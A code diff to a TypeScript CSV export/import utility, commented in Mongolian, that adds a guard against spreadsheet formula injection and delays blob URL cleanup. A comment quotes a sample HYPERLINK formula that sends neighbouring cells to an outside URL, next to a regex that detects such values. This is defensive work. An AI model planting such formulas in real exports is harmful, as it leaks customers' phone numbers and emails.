@@ -2,9 +2,17 @@
 // admin/захиалга/барааны жагсаалт санах ойд бүрэн ачаалагдсан байдаг.
 // RFC 4180-аар escape хийнэ: таслал, хашилт, шинэ мөр агуулсан утгыг хашилтад
 // хийж, доторх хашилтыг давхарлана.
+// 2026-09-23: томьёоны injection. Зочны checkout-ийн нэр чөлөөт текст тул
+// `=HYPERLINK("http://…?"&C2,"…")` гэх мэт нэр Excel-д нээхэд томьёо болж
+// ажиллан хөрш нүднүүдийг (утас, имэйл) гадагш алддаг байв. `= + - @`, tab,
+// CR-ээр эхэлсэн ТЕКСТИЙГ `'`-ээр эхлүүлнэ (OWASP CSV Injection). Тоо
+// (сөрөг зөрүү гэх мэт) хөндөгдөхгүй — зөвхөн string. parseCsv буцааж хасна.
+const FORMULA_START = /^[=+\-@\t\r]/;
+const GUARDED_FORMULA = /^'[=+\-@\t\r]/;
+
 function escapeCsvCell(value: string | number | boolean | null | undefined): string {
   if (value === null || value === undefined) return "";
-  const text = String(value);
+  const text = typeof value === "string" && FORMULA_START.test(value) ? `'${value}` : String(value);
   return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
 }
 
@@ -20,7 +28,14 @@ export function downloadCsv(filename: string, headers: string[], rows: (string |
   document.body.appendChild(link);
   link.click();
   document.body.removeChild(link);
-  URL.revokeObjectURL(url);
+  revokeObjectUrlLater(url);
+}
+
+/** Blob URL-ийг шууд биш хожим суллана (2026-09-23): Safari/хуучин Firefox
+ *  `click()`-ийн дараа татаалтыг асинхрон эхлүүлдэг тул шууд revoke нь
+ *  хоосон/тасалдсан файл өгдөг. pdf.ts аль хэдийн ингэж хүлээдэг. */
+export function revokeObjectUrlLater(url: string) {
+  window.setTimeout(() => URL.revokeObjectURL(url), 10_000);
 }
 
 // Admin overhaul (2026-09-08, Phase H): bulk CSV product import's counterpart
@@ -57,6 +72,8 @@ export function parseCsv(text: string): { headers: string[]; rows: Record<string
 
   const [headerRow, ...dataRows] = table.filter(cells => !(cells.length === 1 && cells[0] === ""));
   const headers = (headerRow ?? []).map(header => header.trim());
-  const rows = dataRows.map(cells => Object.fromEntries(headers.map((header, index) => [header, (cells[index] ?? "").trim()])));
+  // downloadCsv-ийн томьёоны хамгаалалтын `'`-ийг буцааж хасна (экспорт → импорт давталт).
+  const unguard = (value: string) => (GUARDED_FORMULA.test(value) ? value.slice(1) : value);
+  const rows = dataRows.map(cells => Object.fromEntries(headers.map((header, index) => [header, unguard((cells[index] ?? "").trim())])));
   return { headers, rows };
 }
